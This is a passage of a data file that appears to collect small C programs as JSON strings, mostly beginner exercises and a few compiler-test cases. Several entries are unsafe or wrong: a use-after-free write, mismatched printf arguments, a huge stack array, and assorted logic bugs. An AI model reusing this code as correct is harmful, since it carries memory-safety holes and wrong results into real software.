srand(time(NULL));\n    test();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a = 5, b = 10;\n    printf(\"a * b = %d\", ++a*b);\n    a = 5;\n    b = 10;\n    printf(\"\\n\\na * b = %d\", a++*b);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid push(int value, int *list, int *index){\n    if((*index) < 10 - 1){\n        (*index) = (*index) + 1;\n        list[(*index)] = value;\n    }\n}\nvoid pop(int *index){\n    if(*index > -1){\n        (*index) = (*index) - 1;\n    }\n}\nvoid printList(int *list, int size){\n    printf(\"\\n---Pilha---\\n\");\n    for(int i = 0; i <= size; i++){\n        printf(\"%d\", list[i]);\n        printf(\"-\");\n    }\n    printf(\"\\n\");\n}\nint main()\n{\n    int lista[10];\n    int topIndex = -1;\n    int userChoice;\n    int addValue;\n    do{\n        printf(\"escolha sua acao: \\n[1]Inserir na pilha \\n[2]Retirar da fila\");\n        scanf(\"%d\", &userChoice);\n        switch(userChoice){\n            case 1:\n                printf(\"\\nDigite o valor a ser adicionado: \");\n                scanf(\"%d\", &addValue);\n                push(addValue, lista, &topIndex);\n                break;\n            case 2:\n                pop(&topIndex);\n                break;\n            default:\n                break;\n        }\n        system(\"cls\");\n        printList(lista,topIndex);\n    }while(userChoice == 1 || userChoice == 2);\n    return 0;\n}",
    "#include <stdio.h>\nint fact(int a){\n    if(a == 0) return 1;\n    return a * fact(a - 1);\n}\nint fib(int n){\n    if(n == 1) return 0;\n    if(n == 2) return 1;\n    return fib(n-1) + fib(n-2);\n}\nint gcd(int a, int b){\n    if(a < b) return gcd(b, a);\n    if(a % b == 0) return b;\n    return gcd(b, a % b);\n}\nint main(){\n    printf(\"Factorial of 5 is %d\\n\", fact(5));\n    int i, prod = 1;\n    for(i = 1; i <= 5; i++)\n        prod *= i;\n    printf(\"Factorial of 5 is %d\\n\", prod);\n    printf(\"GCD of 9 and 12 is %d\\n\", gcd(9, 12));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\nint max(int a, int b)\n{\n return ((a>b)?a:b);\n}\nint min(int a, int b)\n{\n return ((a<b)?a:b);\n}\nint main()\n{\n int p,q,r,i,j,k,fi,fj,fk;\n scanf(\"%d %d %d\",&p,&q,&r);\n int diff=999999,minimum,maximum;\n int* a = malloc(p*sizeof(int));\n int* b = malloc(q*sizeof(int));\n int* c = malloc(r*sizeof(int));\n for(i=0;i<p;i++) scanf(\"%d\",&a[i]);\n for(j=0;j<q;j++) scanf(\"%d\",&b[j]);\n for(k=0;k<r;k++) scanf(\"%d\",&c[k]);\n i=j=k=0;\n while(i<p&&j<q&&k<r)\n {\n  minimum = min(a[i],min(b[j],c[k]));\n  maximum = max(a[i],max(b[j],c[k]));\n  if(maximum-minimum < diff)\n  {\n   fi=i; fj=j; fk=k;\n   diff = maximum-minimum;\n  }\n  if(diff == 0) break;\n  if(minimum == a[i]) i++;\n  else if(minimum == b[j]) j++;\n  else k++;\n }\n printf(\"%d %d %d\\n\",a[fi],b[fj],c[fk]);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n  double s = 1;\n  int i = 0;\n  for (i = 2; i < 101; i++)\n    s += (1.0f / i);\n  printf(\"%.2lf\\n\", s);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n\nvoid die(char *path) {\n  perror(path);\n  exit(1);\n}\nvoid output_fd(int fd, char *path) {\n  char buf[2048];\n  int charlen;\n  for (;;) {\n    charlen = read(fd, buf, sizeof buf);\n    if (charlen < 0)\n      die(path);\n    if (charlen == 0)\n      break;\n    if (write(1, buf, charlen) < 0)\n      die(path);\n  }\n}\nvoid output_file(char *path) {\n  int fd;\n  fd = open (path, (0x04000000));\n  if (fd < 0) {\n    die(path);\n  }\n  output_fd(fd, path);\n  if (close(fd) < 0)\n    die(path);\n}\nint main(int argc, char* argv[]) {\n  if (argc < 2) {\n    output_fd(0, \"/dev/stdin\");\n    return 0;\n  }\n  for (int file_num = 1; file_num < argc; file_num++) {\n    output_file(argv[file_num]);\n  }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    float n;\n    int x;\n    char c;\n    printf(\"Choose a option:\\n\");\n    printf(\"(a). Positive or Negative.\\n\");\n    printf(\"(b). Even or Odd.\\n\");\n    printf(\"(c). Exit.\\n\");\n    printf(\"Enter your choice: \");\n    scanf(\"%c\",&c);\n    switch (c)\n    {\n    case 'a': case 'A':\n        printf(\"\\n(a). Positive or Negative.\\n\");\n        printf(\"Enter a number: \");\n        scanf(\"%f\",&n);\n        if (n>0)\n            printf(\"\\nThe number %.2f is Positive.\\n\",n);\n        else if (n<0)\n            printf(\"\\nThe number %.2f is Negative.\\n\",n);\n        else\n            printf(\"\\nThe number %.2f is Zero.\\n\",n);\n        break;\n    case 'b': case 'B':\n        printf(\"\\n(b). Even or Odd.\\n\");\n        printf(\"Enter a number: \");\n        scanf(\"%d\",&x);\n        if (x%2==0)\n            printf(\"\\nThe number %d is Even.\\n\",x);\n        else\n            printf(\"\\nThe number %d is Odd.\\n\",x);\n        break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int n = 4;\n    int m = 5;\n    float f = 7.0f;\n    float g = 8.0f;\n    printf(\"%d\\n\", n, m);\n    printf(\"%d %d %d\\n\", n);\n    printf(\"%d %d\\n\", f, g);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n#include <string.h>\n#include <stdbool.h>\nchar *to_sort = \"zdvixqcuvd\";\nint main(int argc, char **argv)\n{\n    _Bool asc;\n    if (argc != 3)\n    {\n        printf(\"Usage: ./insertSort [asc|dsc] to_sort\\n\");\n        return 1;\n    }\n    if (strcmp(argv[1], \"asc\") == 0)\n    {\n        asc = 1;\n    }\n    else if (strcmp(argv[1], \"dsc\") == 0)\n    {\n        asc = 0;\n    }\n    else\n    {\n        printf(\"Usage: ./insertSort [asc|dsc] to_sort\\n\");\n        return 1;\n    }\n    to_sort = argv[2];\n    int size = strlen(to_sort);\n    int max;\n    int idx;\n    for (int i = 0 ; i < size; i++)\n    {\n        max = to_sort[i];\n        idx = i - 1;\n        _Bool cond;\n        if (!asc)\n        {\n            cond = tolower(max) > tolower(to_sort[idx]);\n        }\n        else\n        {\n            cond = tolower(max) < tolower(to_sort[idx]);\n        }\n        while(idx >= 0 && cond)\n        {\n            to_sort[idx + 1] = to_sort[idx];\n            idx--;\n            cond = !asc ? tolower(max) > tolower(to_sort[idx]) :\n                            tolower(max) < tolower(to_sort[idx]);\n        }\n        to_sort[idx+1] = max;\n    }\n    printf(\"%s\\n\", to_sort);\n    return 0;\n}",
    "int main() {\n    int i = 0;\n    for (;;) {\n        i = i + 1;\n        if (i == 5) {\n            break;\n        }\n    }\n    return i;\n}",
    "#include<stdio.h>\nint main() {\n    int i, raw, space;\n    for(i=1; i<=10; ++i)\n    {\n        for(raw=1; raw<=i; raw++) {\n            printf(\"* \");\n        }\n        for(space=i; space<=20-i-1; space++) {\n            printf(\"  \");\n        }\n        for(raw=1; raw<=i; raw++) {\n            printf(\"* \");\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint strl(char str[]){\n    int i=0;\n    while(*(str++)!='\\0'){\n        i++;\n    }\n    return i;\n}\nint main() {\n char str[100];int i;\n scanf(\"%s\",str);\n     int n=strl(str);\n char str1[50],str2[50];\n    if(n%2==0){\n        for(i=0;i<n/2;i++){\n     str1[i]=str[i];\n        }\n     for(i=0;i<n/2;i++){\n     str2[i]=str[n/2+n%2+i];\n       }\n    }\n   else {\n       for(i=0;i<n/2;i++){\n        str1[i]=str[i];\n       }\n       str1[i]='\\0';\n       for(i=0;i<=n/2;i++){\n        str2[i]=str[n/2+1+i];\n        str2[n/2]=str[n/2];\n       }str2[n/2+1]='\\0';\n    }\n printf(\"%s%s\",str2,str1);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int n, m, i, j, a[10][10], b[10][10], c[10][10], result[10][10];\n  printf(\"Enter the number of rows and columns:\\n\");\n  scanf(\"%d%d\", &n, &m);\n  printf(\"Enter the value for first matrix:\\n\");\n  for (i = 0; i < n; i++)\n  {\n    for (j = 0; j < m; j++)\n    {\n      scanf(\"%d\", &a[i][j]);\n    }\n  }\n  printf(\"Enter the value for second matrix:\\n\");\n  for (i = 0; i < n; i++)\n  {\n    for (j = 0; j < m; j++)\n    {\n      scanf(\"%d\", &b[i][j]);\n    }\n  }\n  printf(\"Enter the value for third matrix:\\n\");\n  for (i = 0; i < n; i++)\n  {\n    for (j = 0; j < m; j++)\n    {\n      scanf(\"%d\", &c[i][j]);\n    }\n  }\n  printf(\"Sum of entered matrices:\\n\");\n  for (i = 0; i < n; i++)\n  {\n    for (j = 0; j < m; j++)\n    {\n      result[i][j] = a[i][j] + b[i][j] - c[i][j];\n      printf(\"%d\\t\", result[i][j]);\n    }\n    printf(\"\\n\");\n  }\n  return 0;\n}",
    "#include <ctype.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <getopt.h>\nint str_cut(char *str, int begin, int len);\nint main(){\n    int z;\n    char name[100];\n    char i = name[0];\n    puts(\"Enter your name:\");\n    scanf (\"%[^\\n]%*c\", name);\n    printf(\"%c\", name[0]);\n    for (int j = 0, y = strlen(name); j < y; j++){\n      if (name[j] == ' '){\n        z = j + 1;\n        printf(\"%c\", name[z]);\n      }\n    }\n    printf(\"\\n\");\n}\nint str_cut(char *str, int begin, int len)\n{\n    int l = strlen(str);\n    if (len < 0) len = l - begin;\n    if (begin + len > l) len = l - begin;\n    memmove(str + begin, str + begin + len, l - len + 1);\n    return len;\n}",
    "#include <err.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int *p1, *p2;\n    if (!(p1 = (int *) malloc(sizeof(int))))\n        errx(1, \"can't allocate int\");\n    *p1 = 15;\n    p2 = p1;\n    free(p1);\n    *p2 = 17;\n    printf(\"%p -> %d\\n\", p2, *p2);\n    return 0;\n}",
    "int main()\n{\n  int a[10], *pa, b[10], *pb, res;\n  pa = &a[0];\n  pb = &b[0];\n begin:\n  if (*pb + *pa > 0) goto end;\n middle1:\n  pa ++;\n  if (*pb + *pa > 0) goto end;\n middle2:\n  pb ++;\n  if (*pb + *pa > 0) goto end;\n  else goto begin;\n end:\n  res = *pa + *pb;\n  return res;\n}",
    "#include <stdio.h>\nint main()\n{\n    int p;\n    printf(\"Enter paisa: \");\n    scanf(\"%d\",&p);\n    printf(\"%d paisa = %d ruppee and %d paisa\" ,p,p/100,p%100);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int n1,n2,n3;\n    scanf(\"%d%d%d\",&n1,&n2,&n3);\n    int total=n1+n2+n3;\n    int max=0;\n    int arr[10000000]={0};\n    for(int i=0;i<total;i++)\n    {\n        int temp;\n        scanf(\"%d\",&temp);\n        arr[temp-1]++;\n        if(temp>max)\n        {\n            max=temp;\n        }\n    }\n    int count=0;\n    for(int i=0;i<max;i++)\n    {\n        if(arr[i]>=2)\n        {\n            count++;\n        }\n    }\n    printf(\"%d\\n\",count);\n     for(int i=0;i<max;i++)\n    {\n        if(arr[i]>=2)\n        {\n            printf(\"%d\\n\",i+1);\n        }\n    }\n return 0;\n}",
    "#include <stdio.h>\nint max_of_four(int a, int b, int c, int d){\n    int min=a;\n    if(min<=b)\n        min=b;\n    if(min<=c)\n        min=c;\n    if(min<=d)\n        min=d;\n    return min;\n}\nint main() {\n    int a, b, c, d;\n    scanf(\"%d %d %d %d\", &a, &b, &c, &d);\n    int ans = max_of_four(a, b, c, d);\n    printf(\"%d\", ans);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,n;\n  printf(\"enter the value of n:\");\n  scanf(\"%d\",&n);\n  if(n>0)\n  {\n    for(i=0;i<=n;i++)\n      { printf(\"the integers from 0 to n are:\");\n             for(i=0;i<n;i++)\n               printf(\"%d,\",i);\n      }\n  }\n      else\n        printf(\"please enter a positive integer.\");\n  printf(\"%d\",i);\n  return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <fcntl.h>\nint main(int argc, char **argv)\n{\n    char buf[1024];\n    int fd, n;\n    if (argc == 1)\n    {\n        n = read(0, buf, 1024);\n        write(1, buf, n);\n    }\n    while (--argc > 0)\n    {\n        fd = open(*(++argv), (0x04000000), 0);\n        n = read(fd, buf, 1024);\n        write(1, buf, n);\n        close(fd);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nvoid swap(int *xp,int *yp)\n{\n    int temp;\n    temp=*xp;\n    *xp=*yp;\n    *yp=temp;\n}\nvoid printArray(int arr[],int size)\n{\n    int i;\n    printf(\"***Sorted array is**\\n\");\n    for(i=0;i<size;i++)\n    {\n        printf(\"%d\\n\",arr[i]);\n    }\n    printf(\"\\n\");\n}\nvoid bubble_sort(int arr[],int n)\n{\n    int i,j;\n    for(i=0;i<n-1;i++)\n    {\n        for(j=0;j<n-i-1;j++)\n        {\n            if(arr[j]>arr[j+1])\n                swap(&arr[j],&arr[j+1]);\n        }\n    }\n}\nint main()\n{\n    int i,arr[50],n;\n    printf(\"Enter array size\\n\");\n    scanf(\"%d\",&n);\n    printf(\"Enter array\\n\");\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%d\",&arr[i]);\n    }\n    bubble_sort(arr,n);\n    printArray(arr,n);\n    printf(\"\\nArray is sorted\");\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nint dice[4];\nint rec[7] = {0};\nint condition = 0;\nint cnt = 0;\nint vis[7]={0};\nint main()\n{\n    for(int i = 0; i < 4; i++){\n        scanf(\"%d\", &dice[i]);\n        rec[dice[i]]++;\n        if(!vis[dice[i]]){\n            vis[dice[i]] = 1;\n            cnt++;\n        }\n    }\n    if(cnt == 4) condition = 2;\n    for(int i = 1; i <= 6; i++){\n        if(rec[i] == 3) condition = 2;\n        else if(rec[i] == 4) condition = 1;\n    }\n    if(condition == 1) printf(\"WIN\");\n    else if(condition == 2) printf(\"R\");\n    else{\n        int avoid_num;\n        int sum=0;\n        for(int i = 1; i <= 6; i++)\n            if(rec[i] == 2){\n                avoid_num = i;break;\n            }\n        for(int i = 1; i <= 6; i++){\n            if(i == avoid_num) continue;\n            sum += rec[i] * i;\n        }\n        printf(\"%d\", sum);\n    }\n    printf(\"\\n\");\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main() {\n    long id = gethostid();\n    printf(\"%ld\\n\", id);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n    int ant,bug;\n    scanf(\"%d %d\",&ant,&bug);\n    if (abs(ant)<abs(bug)) {\n     printf(\"Ant\\n\");\n    } else if (abs(ant)>abs(bug)) {\n     printf(\"Bug\\n\");\n    } else {\n     printf(\"Draw\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <sys/ioctl.h>\n#include <unistd.h>\n#include <fcntl.h>\nvoid print_errno();\nvoid print_ioctl();\nvoid print_fcntl();\nint main()\n{\n    print_errno();\n    print_ioctl();\n    print_fcntl();\n}\nvoid print_errno()\n{\n    printf(\"=== ERRNO ===\\n\");\n    printf(\"EPERM is (int) 0x%x\\n\", (63));\n    printf(\"ENOENT is (int) 0x%x\\n\", (44));\n    printf(\"ESRCH is (int) 0x%x\\n\", (71));\n    printf(\"EINTR is (int) 0x%x\\n\", (27));\n    printf(\"EIO is (int) 0x%x\\n\", (29));\n    printf(\"ENXIO is (int) 0x%x\\n\", (60));\n    printf(\"E2BIG is (int) 0x%x\\n\", (1));\n    printf(\"ENOEXEC is (int) 0x%x\\n\", (45));\n    printf(\"EBADF is (int) 0x%x\\n\", (8));\n    printf(\"ECHILD is (int) 0x%x\\n\", (12));\n    printf(\"EAGAIN is (int) 0x%x\\n\", (6));\n    printf(\"ENOMEM is (int) 0x%x\\n\", (48));\n    printf(\"EACCES is (int) 0x%x\\n\", (2));\n    printf(\"EFAULT is (int) 0x%x\\n\", (21));\n    printf(\"ENOTBLK is (int) 0x%x\\n\", ENOTBLK);\n    printf(\"EBUSY is (int) 0x%x\\n\", (10));\n    printf(\"EEXIST is (int) 0x%x\\n\", (20));\n    printf(\"EXDEV is (int) 0x%x\\n\", (75));\n    printf(\"ENODEV is (int) 0x%x\\n\", (43));\n    printf(\"ENOTDIR is (int) 0x%x\\n\", (54));\n    printf(\"EISDIR is (int) 0x%x\\n\", (31));\n    printf(\"EINVAL is (int) 0x%x\\n\", (28));\n    printf(\"ENFILE is (int) 0x%x\\n\", (41));\n    printf(\"EMFILE is (int) 0x%x\\n\", (33));\n    printf(\"ENOTTY is (int) 0x%x\\n\", (59));\n    printf(\"ETXTBSY is (int) 0x%x\\n\", (74));\n    printf(\"EFBIG is (int) 0x%x\\n\", (22));\n    printf(\"ENOSPC is (int) 0x%x\\n\", (51));\n    printf(\"ESPIPE is (int) 0x%x\\n\", (70));\n    printf(\"EROFS is (int) 0x%x\\n\", (69));\n    printf(\"EMLINK is (int) 0x%x\\n\", (34));\n    printf(\"EPIPE is (int) 0x%x\\n\", (64));\n    printf(\"EDOM is (int) 0x%x\\n\", (18));\n    printf(\"ERANGE is (int) 0x%x\\n\", (68));\n    printf(\"EDEADLK is (int) 0x%x\\n\", (16));\n    printf(\"ENAMETOOLONG is (int) 0x%x\\n\", (37));\n    printf(\"ENOLCK is (int) 0x%x\\n\", (46));\n    printf(\"ENOSYS is (int) 0x%x\\n\", (52));\n    printf(\"ENOTEMPTY is (int) 0x%x\\n\", (55));\n    printf(\"ELOOP is (int) 0x%x\\n\", (32));\n    printf(\"EWOULDBLOCK is (int) 0x%x\\n\", (6));\n    printf(\"ENOMSG is (int) 0x%x\\n\", (49));\n    printf(\"EIDRM is (int) 0x%x\\n\", (24));\n    printf(\"=== ERRNO ===\\n\\n\");\n}\nvoid print_ioctl()\n{\n    printf(\"=== IOCTL ===\\n\");\n    printf(\"TIOCSWINSZ is (long) 0x%lx\\n\", TIOCSWINSZ);\n    printf(\"TIOCSCTTY is (int) 0x%x\\n\", TIOCSCTTY);\n    printf(\"TIOCNOTTY is (int) 0x%x\\n\", TIOCNOTTY);\n    printf(\"=== IOCTL ===\\n\\n\");\n}\nvoid print_fcntl()\n{\n    printf(\"=== FCNTL ===\\n\");\n    printf(\"F_SETFD is (int) 0x%x\\n\", (2));\n    printf(\"O_CLOEXEC is (int) 0x%x\\n\", (0));\n    printf(\"FD_CLOEXEC is (int) 0x%x\\n\", (1));\n    printf(\"=== FCNTL ===\\n\\n\");\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"Programa Escrito em C\");\n}",
    "__attribute__ ((noinline))\nvoid test(char *p, char c, int len)\n{\n  __builtin_memset(p, c, len);\n}\n__attribute__ ((noinline))\nvoid test2(char *p, int c, int len)\n{\n  __builtin_memset(p, (char)c, len);\n}\n\nchar buf[500 + 2];\nvoid init_buf(void)\n{\n  int i;\n  buf[0] = 0;\n  for (i = 1; i <= 500; i++)\n    buf[i] = (0x10 + (i & 0x3f));\n  buf[500 + 1] = 0x7f;\n}\nvoid validate_buf(char val)\n{\n  int i;\n  if (buf[0] != 0)\n    __builtin_abort();\n  for (i = 1; i <= 500; i++)\n    if (buf[i] != val)\n      __builtin_abort();\n  if (buf[500 + 1] != 0x7f)\n    __builtin_abort();\n}\nint main(void)\n{\n  init_buf();\n  test(buf + 1, 55, 500);\n  validate_buf(55);\n  init_buf();\n  test(buf + 1, 66, 500);\n  validate_buf(66);\n}",
    "#include <stdio.h>\nint main() {\n    int value;\n    scanf(\"%d\", &value);\n    printf(\"%d\\n\", value);\n    printf(\"%d nota(s) de R$ 100,00\\n\", (value / 100));\n    printf(\"%d nota(s) de R$ 50,00\\n\", (value = (value % 100)) / 50);\n    printf(\"%d nota(s) de R$ 20,00\\n\", (value = (value % 50)) / 20);\n    printf(\"%d nota(s) de R$ 10,00\\n\", (value = (value % 20)) / 10);\n    printf(\"%d nota(s) de R$ 5,00\\n\", (value = (value % 10)) / 5);\n    printf(\"%d nota(s) de R$ 2,00\\n\", (value = (value % 5)) / 2);\n    printf(\"%d nota(s) de R$ 1,00\\n\", (value % 2));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n  FILE *readableFile = fopen(\"this file should not exist\", \"r\");\n  if (readableFile == ((void*)0)) {\n    printf(\"error opening file!\\n\");\n    exit(0);\n  } else {\n    exit(-1);\n  }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n    char s[200];\n    int count = 0, i;\n    printf(\"Enter the string:\\n\");\n    scanf(\"%[^\\n]s\", s);\n    for (i = 0;s[i] != '\\0';i++)\n    {\n        if (s[i] == ' ' && s[i+1] != ' ')\n            count++;\n    }\n    printf(\"Number of words in given string are: %d\\n\", count + 1);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nunion araba{\n    char model[50];\n    int fiyat;\n};\nint main()\n{\n    return 0;\n}",
    "#include<stdio.h>\nunsigned long long int fatorialduplo(unsigned long long int n){\n    unsigned long long int k=n;\n    if(n==1){\n        return 1;\n    }else {\n        if(n%2==0){\n            k=1;\n        }\n        return k*fatorialduplo(n-1);\n    }\n}\nint main(void){\n    unsigned long long int n;\n    scanf(\"%llu\",&n);\n    printf(\"%llu\",fatorialduplo(n));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    double previous, current;\n    int n;\n    int count = 0;\n    int index = 0;\n    printf(\"Enter sequence\\n\");\n    n = scanf(\"%lf\", &previous);\n        if (n != 1) {\n            printf(\"Wrong input (prev)\\n\");\n            return 1;\n        }\n    n = scanf(\"%lf\", &current);\n    index = 1;\n    if (n != 1) {\n        printf(\"Count = %d\\n\", count);\n        return 0;\n    } else {\n        if (current < previous) {\n            count++;\n            printf(\"Index = %d\\n\", index);\n        }\n    }\n    while (1) {\n        previous = current;\n        n = scanf(\"%lf\", &current);\n        index++;\n        if (n != 1) {\n            printf(\"Count = %d\\n\", count);\n            return 0;\n        } else {\n            if (current < previous) {\n                count++;\n                printf(\"Index = %d\\n\", index);\n            }\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdint.h>\n#include <stdbool.h>\n#include <assert.h>\n#include <stdlib.h>\nbool isbad_alphabet(const char* alphabet) {\n\tuint64_t len = strlen(alphabet);\n\tif (len < 2) {\n\t\treturn true;\n\t}\n\tfor (int i = 0; i < len ; i++) {\n\t\tif (strchr(alphabet + i + 1, alphabet[i]))\n\t\t\treturn true;\n\t}\n\treturn false;\n}\nuint64_t converted_len(uint64_t nb, short base) {\n\tif (nb > base - 1) {\n\t\treturn (converted_len(nb/base, base) + 1);\n\t}\n\treturn 1;\n}\nvoid convertion(uint64_t nb, const char* alphabet, short base, char* converted) {\n\t*(converted) = *(alphabet + nb%base);\n\tif (nb > base - 1) {\n\t\tconvertion(nb/base, alphabet, base, --converted);\n\t}\n}\nchar* decimal_to_anybase(uint64_t nb, const char* alphabet) {\n\tchar* converted;\n\tif (isbad_alphabet(alphabet)) {\n\t\treturn NULL;\n\t}\n\tuint64_t base = strlen(alphabet);\n\tuint64_t final_len = converted_len(nb, base);\n\tconverted = malloc(sizeof(char) * (final_len + 1));\n\tconverted[final_len] = 0;\n\tconvertion(nb, alphabet, base, converted + final_len - 1);\n\treturn converted;\n}\nstatic void test()\n{\n\tchar* ret = NULL;\n\tchar* reference = NULL;\n\treference = \"0\";\n\tret = decimal_to_anybase(0, \"0123456789\");\n\tfor (int i = 0; i < strlen(reference) && i < strlen(ret); i++) {\n\t\tassert(ret[i] == reference[i]);\n\t}\n\tif (ret != NULL) {\n\t\tfree(ret);\n\t}\n\treference = \"18446744073709551615\";\n\tret = decimal_to_anybase(18446744073709551615, \"0123456789\");\n\tfor (int i = 0; i < strlen(reference) && i < strlen(ret); i++) {\n\t\tassert(ret[i] == reference[i]);\n\t}\n\tif (ret != NULL) {\n\t\tfree(ret);\n\t}\n\treference = \"18446744073709551615\";\n\tret = decimal_to_anybase(-1, \"0123456789\");\n\tfor (int i = 0; i < strlen(reference) && i < strlen(ret); i++) {\n\t\tassert(ret[i] == reference[i]);\n\t}\n\tif (ret != NULL) {\n\t\tfree(ret);\n\t}\n\treference = \"101010\";\n\tret = decimal_to_anybase(42, \"01\");\n\tfor (int i = 0; i < strlen(reference) && i < strlen(ret); i++) {\n\t\tassert(ret[i] == reference[i]);\n\t}\n\tif (ret != NULL) {\n\t\tfree(ret);\n\t}\n\treference = \"52\";\n\tret = decimal_to_anybase(42, \"01234567\");\n\tfor (int i = 0; i < strlen(reference) && i < strlen(ret); i++) {\n\t\tassert(ret[i] == reference[i]);\n\t}\n\tif (ret != NULL) {\n\t\tfree(ret);\n\t}\n\treference = \"2A\";\n\tret = decimal_to_anybase(42, \"0123456789ABCDEF\");\n\tfor (int i = 0; i < strlen(reference) && i < strlen(ret); i++) {\n\t\tassert(ret[i] == reference[i]);\n\t}\n\tif (ret != NULL) {\n\t\tfree(ret);\n\t}\n\tprintf(\"[+] All tests have successfully passed!\\n\");\n}\nint main()\n{\n\ttest();\n\treturn 0;\n}",
    "#include <stdio.h>\nint main ( void )\n {\n  void quad_sol ( int a, int b, int c ) ;\n  int a, b,c ;\n  printf( \"Enter the values for the quadratic equation\\na = \" ) ;\n  scanf ( \"%i\", &a) ;\n  printf ( \"b = \" ) ;\n  scanf ( \"%i\", &b) ;\n  printf ( \"c = \" ) ;\n  scanf ( \"%i\", &c) ;\n  quad_sol ( a, b, c ) ;\n  return 0 ;\n }\nvoid quad_sol ( int a, int b, int c )\n {\n  double sqRoot (double x) ;\n  int dis = b * b - 4 * a * c ;\n  if ( dis < 0 )\n   {\n    printf ( \"X1 and X2 are imaginary numbers\\n\" ) ;\n    return ;\n   }\n  double x1 = ( -b + sqRoot ( b * b - 4 * a * c ) ) / ( 2 * a ) ;\n  double x2 = ( -b - sqRoot ( b * b - 4 * a * c ) ) / ( 2 * a ) ;\n  double zero = 0 ;\n  printf ( \"X1 = %.2f\\nX2 = %.2f\\n\", ( x1 == 0.0 ) ? zero : x1 , ( x2 == 0.0 ) ? zero : x2 ) ;\n  return ;\n }\ndouble sqRoot ( double x )\n {\n  float absVal ( float x ) ;\n  double g = 1.0 ;\n  double e = 1.0000000001 ;\n  while ( absVal ( g * g / x ) >= e || g == 1.0 )\n   g = (x / g + g) / 2.0 ;\n  return g ;\n }\nfloat absVal ( float x )\n {\n  if ( x < 0 )\n   x = -x ;\n  return x ;\n }",
    "#include <stdint.h>\n#include <stdio.h>\n#include <string.h>\nint main(int argc, char** argv)\n{\n    uint64_t a[2] = { 0 };\n    strncpy((char*)a, argv[1], 16);\n    printf(\"a: %lx\\n\", a[0]);\n    printf(\"b: %lx\\n\", a[1]);\n    return 0;\n}",
    "#include<stdio.h>\nint main() {\n    printf(\" string modification using pointer \\n\");\n    char *pointer=\"string_name\";\n    printf(\"\\n value stored in pointer: %s\",pointer);\n    pointer=\"new_string_name\";\n    printf(\"\\n new value stored in pointer: %s\",pointer);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nvoid f1()\n{\n    srand((unsigned)time(((void*)0)));\n    int r = rand();\n    printf(\"[f1] %d | %d \\n\", r, r % 10000);\n}\nint main()\n{\n    f1();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void)\n{\n    int iRand = 0;\n    int iGuess = 0;\n    int iTries = 0;\n    srand(time(((void*)0)));\n    iRand = rand() % 5 + 1;\n    printf(\"\\n<<< EX005 - Ser\u00e1 que voc\u00ea acerta? >>>\\n\\n\\n\");\n    printf(\"Vou pensar em um n\u00famero entre 1 e 5. Tente advinhar!\\n\");\n    printf(\"Voc\u00ea tem 3 chances!\\n\");\n    while (iTries != 3)\n    {\n        printf(\"\\nTentativa: %d\\n\", iTries + 1);\n        printf(\"Qual \u00e9 o seu palpite? \");\n        scanf(\" %d\", &iGuess);\n        if (iGuess == iRand)\n        {\n            printf(\"\\nParab\u00e9ns voc\u00ea acertou na %d\u00ba tentativa!\\n\", iTries + 1);\n            return 0;\n        }\n        else if (iGuess < iRand)\n        {\n            printf(\"\\nO n\u00famero que pensei \u00e9 maior que %d.\\n\", iGuess);\n        }\n        else\n        {\n            printf(\"\\nO n\u00famero que pensei \u00e9 menor que %d.\\n\", iGuess);\n        }\n        iTries++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint find_nth_term(int n, int a, int b, int c) {\n    int x = a + b + c;\n    if (n >= 4)\n        x = find_nth_term(--n, b, c, a+b+c);\n    else if (n == 3)\n        x = c;\n    else if (n == 2)\n        x = b;\n    else if (n == 3)\n        x = a;\n    return x;\n}\nint main() {\n    int n, a, b, c;\n    scanf(\"%d %d %d %d\", &n, &a, &b, &c);\n    int ans = find_nth_term(n, a, b, c);\n    printf(\"%d\", ans);\n    return 0;\n}",
    "int main() {\n    return 2>3;\n}",
    "#include <stdio.h>\nint main (int argc, char *argv []) {\n int i;\n for (i=0; i<argc; i++) {\n  printf (\"argv [%d] = \\\"%s\\\"\\n\", i, argv [i]);\n }\n}",
